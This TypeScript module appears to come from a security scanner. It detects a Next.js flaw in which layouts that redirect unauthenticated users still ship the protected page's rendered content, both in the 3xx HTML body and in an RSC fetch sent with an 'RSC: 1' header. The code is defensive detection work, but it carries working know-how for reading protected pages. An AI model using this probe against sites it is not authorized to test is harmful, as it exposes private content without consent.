import rawRequest, { type RawResponse } from "../../../exploit/utility/rawRequest.js";
import { containsNextRedirectMarker, containsRenderedPageSegment, decodeHtmlFlight } from "./rsfShared.js";

/**
 * A layout that authenticates by calling `redirect()` doesn't stop the page
 * under it from rendering. Next.js still serializes the page's output into the same response as
 * the redirect, so the protected content ships to an unauthenticated client. No forgery needed.
 *
 * - `next_rsfRedirectBodyLeak`: the plain GET's 3xx HTML body.
 * - `next_rsfRscHeaderLeak`: the same request as an RSC fetch (`RSC: 1`).
 *
 * Both require a `NEXT_REDIRECT` record (the redirect came from a layout/page, not middleware,
 * whose 3xx has no body) and a rendered `__PAGE__` segment (`containsRenderedPageSegment`). A page
 * that itself calls `redirect()` renders only the redirect error, so it is not reported.
 */

/** `next_rsfRedirectBodyLeak`: true when a 3xx HTML response carries a rendered page segment. */
export const isRedirectBodyLeak = (baseline: RawResponse): boolean => {
    if (baseline.status < 300 || baseline.status >= 400 || !baseline.body) return false;
    const flight = decodeHtmlFlight(baseline.body);
    return containsNextRedirectMarker(flight) && containsRenderedPageSegment(flight);
};

/** True when an RSC response carries a rendered page segment next to the layout's redirect. */
export const isRscLeakResponse = (res: RawResponse): boolean =>
    res.status === 200 &&
    (res.headers["content-type"] ?? "").includes("text/x-component") &&
    containsNextRedirectMarker(res.body) &&
    containsRenderedPageSegment(res.body);

/**
 * `next_rsfRscHeaderLeak`: fetches `candidateUrl` with `RSC: 1`. Next.js 16 first answers with a
 * 3xx to the same path plus a `_rsc` cache-busting param; that one hop is followed (any other
 * redirect is the real auth redirect and ends the probe). Returns the leaking response and the URL
 * that produced it, or `null`.
 */
export const fetchRscHeaderLeak = async (
    candidateUrl: string,
    timeout: number
): Promise<{ url: string; body: string } | null> => {
    const headers = { RSC: "1" };
    let url = candidateUrl;
    let res = await rawRequest(url, { timeout, headers });
    if (res && res.status >= 300 && res.status < 400 && res.headers["location"]) {
        let next: URL;
        try {
            next = new URL(res.headers["location"], candidateUrl);
        } catch {
            return null;
        }
        if (next.origin !== new URL(candidateUrl).origin) return null;
        if (next.pathname !== new URL(candidateUrl).pathname || !next.searchParams.has("_rsc")) return null;
        url = next.toString();
        res = await rawRequest(url, { timeout, headers });
    }
    return res && isRscLeakResponse(res) ? { url, body: res.body } : null;
};
